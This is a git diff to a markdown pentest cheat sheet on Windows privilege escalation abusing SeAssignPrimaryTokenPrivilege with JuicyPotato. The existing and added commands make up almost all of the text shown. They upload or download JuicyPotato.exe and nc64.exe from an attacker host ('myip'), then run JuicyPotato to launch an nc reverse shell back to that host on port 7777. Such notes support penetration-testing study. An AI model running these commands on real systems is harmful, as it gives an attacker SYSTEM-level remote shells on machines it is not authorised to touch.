@@ -8,6 +8,8 @@ categories: windows
 ## Windows - Privileges Escalation - SeAssignPrimaryTokenPrivilege
 
 
+
+
 ### Privileges
 
 
@@ -40,6 +42,21 @@ PS C:\Users\user\Documents> upload /home/kali/privesc/netcat/nc64.exe
 
 PS C:\Users\user\Documents> .\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\users\user\documents\nc64.exe -e cmd.exe my_ip 7777" -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
 
+```
+
+## Juicy Potato v2
+
+```
+Invoke-WebRequest -Uri "http://myip/JuicyPotato.exe" -OutFile "C:\temp\JuicyPotato.exe"
+```
+
+```
+Invoke-WebRequest -Uri "http://myip/netcat/nc64.exe" -OutFile "C:\temp\nc.exe"
+```
+
+
+```
+.\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe myip 7777" -l 1337
 ```
 
 ### CLSID
